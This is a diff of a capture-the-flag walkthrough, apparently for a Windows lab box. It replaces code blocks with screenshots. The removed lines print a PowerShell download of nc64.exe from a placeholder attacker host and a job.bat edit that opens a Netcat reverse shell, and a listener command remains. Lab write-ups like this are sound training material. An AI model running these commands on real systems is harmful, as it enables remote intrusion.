@@ -42,7 +42,8 @@ Navigating through the website, I found a form on the **Order** page. This form 
 
 ## Task 4: What XML version is used on the target?
 
-To determine the XML version, I used **BurpSuite** with the **FoxyProxy** plugin to intercept requests on port 8080. I submitted random data in the order form and inspected the request payload. This revealed the XML version used by the target.<img width="523" alt="Screenshot 2024-12-07 at 15 14 04" src="https://github.com/user-attachments/assets/468ce6f9-cf86-4911-8d8e-1a9edaff7009">
+To determine the XML version, I used **BurpSuite** with the **FoxyProxy** plugin to intercept requests on port 8080. I submitted random data in the order form and inspected the request payload. This revealed the XML version used by the target.
+<img width="653" alt="Screenshot 2024-12-07 at 16 56 00" src="https://github.com/user-attachments/assets/e84b7e82-8e10-4041-8f5f-fbfc3a37ad4e">
 
 
 ---
@@ -118,20 +119,15 @@ Returning to the **Log-Management** folder, I examined **job.bat**, which was co
 
 I modified **job.bat** to execute a reverse shell using Netcat:
 1. Downloaded **nc64.exe** to the target system. Since the machine had no direct internet access, I hosted a simple HTTP server on the attack box:
-   ```bash
-   python3 -m http.server
-   ```
-   On the target system, I downloaded the file:
-   ```powershell
-   Invoke-WebRequest -Uri http://ATTACKER_IP:8000/nc64.exe -OutFile C:\Log-Management\nc64.exe
-   ```
+<img width="666" alt="Screenshot 2024-12-07 at 16 57 32" src="https://github.com/user-attachments/assets/85775179-e47c-467e-bcfd-351a6510717e">
+<img width="665" alt="Screenshot 2024-12-07 at 16 58 13" src="https://github.com/user-attachments/assets/3d74cc4a-355c-404c-a415-75d390d53372">
 
-2. Edited **job.bat** to include the Netcat reverse shell command:
-   ```bash
-   echo C:\Log-Management\nc64.exe -e cmd.exe ATTACKER_IP PORT > C:\Log-Management\job.bat
-   ```
 
-3. Started a listener on the attack box:
+2. Edited **job.bat** to include the Netcat reverse shell command (Note - exit the powershell first):
+   
+<img width="663" alt="Screenshot 2024-12-07 at 16 58 54" src="https://github.com/user-attachments/assets/b1987228-3639-40c6-83bb-d1f5dda09063">
+
+4. Started a listener on the attack box:
    ```bash
    nc -lvnp PORT
    ```
